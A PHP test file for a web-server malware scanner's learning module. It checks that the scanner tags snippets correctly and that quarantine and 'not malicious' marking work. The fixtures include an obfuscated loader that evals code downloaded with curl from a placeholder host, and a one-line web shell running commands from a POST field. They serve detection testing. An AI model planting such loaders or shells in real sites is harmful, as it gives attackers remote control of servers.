<?php
require __DIR__ . '/../support/bootstrap.php';
require_once SMPRO_BASE . '/includes/helpers.php';
if (!defined('SMPRO_VARLIB')) define('SMPRO_VARLIB', sys_get_temp_dir() . '/t133_varlib_' . getmypid());
require_once SMPRO_BASE . '/includes/learn.php';
/** t133 - Learned Defense: lessons come from confirmed incidents as data (never names in code), the code reader
 *  sees through escaping, every quarantine keeps the original and restores exactly, "not malicious" is remembered. */
$src = str_replace(chr(13), '', (string)file_get_contents(SMPRO_BASE . '/includes/learn.php'));
hasnt($src, 'nf.php', 'N1: no incident file name is written in the engine');
hasnt($src, 'sshx', 'N1: nor a tool name');
hasnt($src, 'Nullcyber', 'N1: nor an attacker name');
has($src, "if (in_array(\$sha, smpro_lr_load('allow'), true)) return [];", 'N2: a file marked not-malicious is never learned again');
has($src, "if (!(\$have >= 3 && \$have > count(\$roots) * 0.05))", 'N3: a place is a lesson only when it is rare on this server');
has($src, "if (\$cfg['auto'] === 'quarantine_exact' && !(function_exists('smpro_ctl_dry_run') && smpro_ctl_dry_run())", 'N4: automatic action only for exact files, never in Dry-Run');
has($src, "if (function_exists('smpro_wpguard_trusted') && smpro_wpguard_trusted(\$p)) return;", "N5: WP Guard's own files are never findings");
hasnt($src, '-o -maxdepth 1', 'N6: no -maxdepth inside the find tests (it is global and silently overrides the depth of the hunt)');
has($src, "' -o ! -path ' . escapeshellarg(\$root . '/*/*') . ' \\) -print", 'N6: top-level files are matched by path, so the hunt keeps descending 8 levels');

// the code reader
$loader = '<?php eval("\x3f\76" . curl_exec(f5APb(curl_init("\150\164\164\160\x73\72\x2f\57\x72\x61\x77\x2e\x65\x78\x61\x6d\x70\x6c\x65\x2e\x63\x6f\x6d\x2f\x61"), function ($d) { curl_setopt_array($d, [CURLOPT_RETURNTRANSFER => 1]); }))); function F5apB($a, $b) { $b($a); return $a; }';
$t = smpro_lr_tags($loader);
is_eq(smpro_lr_tags_strong($t), 'downloads code from the internet and runs it', 'C1: an escaped remote loader is read as what it does');
$shell = '<?php if(isset($_POST["c"])){ echo shell_exec($_POST["c"]); }';
is_eq(smpro_lr_tags_strong(smpro_lr_tags($shell)), 'runs system commands taken from the web request', 'C2: a command shell');
$plain = '<?php $r = curl_init("https://api.example.com/x"); echo json_decode(curl_exec($r), true)["ok"];';
is_eq(smpro_lr_tags_strong(smpro_lr_tags($plain)), '', 'C3: an ordinary API call is not malicious');
// a library (feed parser / backup plugin): a network call and an eval, or exec and $_POST, far apart in the file
$lib = '<?php class Feed { function fetch($u) { $c = curl_init($u); return curl_exec($c); }' . str_repeat("\n  // ...\n", 120) . ' function legacy($x) { return eval("return " . var_export($x, true) . ";"); } }';
is_eq(smpro_lr_tags_strong(smpro_lr_tags($lib), $lib), '', 'C5: a library with a network call and an eval far apart is not a loader');
$bk = '<?php class Backup { function run() { exec("mysqldump --version"); }' . str_repeat("\n  // ...\n", 60) . ' function ajax() { $n = $_POST["nonce"]; } }';
is_eq(smpro_lr_tags_strong(smpro_lr_tags($bk), $bk), '', 'C6: exec and $_POST far apart in a plugin is not a shell');
is_eq(smpro_lr_tags_strong(smpro_lr_tags($loader), $loader), 'downloads code from the internet and runs it', 'C7: the real loader still is (eval takes the download in one expression)');
is_eq(smpro_lr_tags_strong(smpro_lr_tags($shell), $shell), 'runs system commands taken from the web request', 'C8: and a real shell still is');
$cfgf = '<?php define("DB_HOST","localhost"); require_once __DIR__ . "/vendor/autoload.php";';
is_eq(smpro_lr_tags_strong(smpro_lr_tags($cfgf)), '', 'C4: configuration code is not malicious');

// learn → hunt → quarantine → restore, on a fake site in a temp home (no docroot: only hash and behaviour lessons)
$h = sys_get_temp_dir() . '/t133_' . getmypid(); $site = "$h/site"; @mkdir($site, 0755, true);
$bad = "$site/x.php"; file_put_contents($bad, $loader);
$ids = smpro_lr_learn_file($bad, "/home/t133u/public_html/x.php", 'test');
$L = smpro_lr_lessons();
is_eq(in_array('hash', array_map(fn($i) => $L[$i]['type'], $ids), true) && in_array('behaviour', array_map(fn($i) => $L[$i]['type'], $ids), true), true, 'L1: the file taught an exact-file and a behaviour lesson');
is_eq(is_file(smpro_lr_dir() . '/hunt_wanted'), true, 'L2: a new lesson asks for a hunt');
$fp = (string)hash_file('sha256', $bad);
smpro_lr_mark_fp($fp);
$L = smpro_lr_lessons(); $hashOff = false; foreach ($L as $l) if ($l['type'] === 'hash' && strpos($l['key'], $fp) === 0 && $l['state'] === 'off') $hashOff = true;
is_eq($hashOff, true, 'L3: "not malicious" switches the exact-file lesson off');
is_eq(smpro_lr_learn_file($bad, "/home/t133u/public_html/x.php", 'test'), [], 'L4: and the file is never learned again');
exec('rm -rf ' . escapeshellarg($h) . ' ' . escapeshellarg(SMPRO_VARLIB));
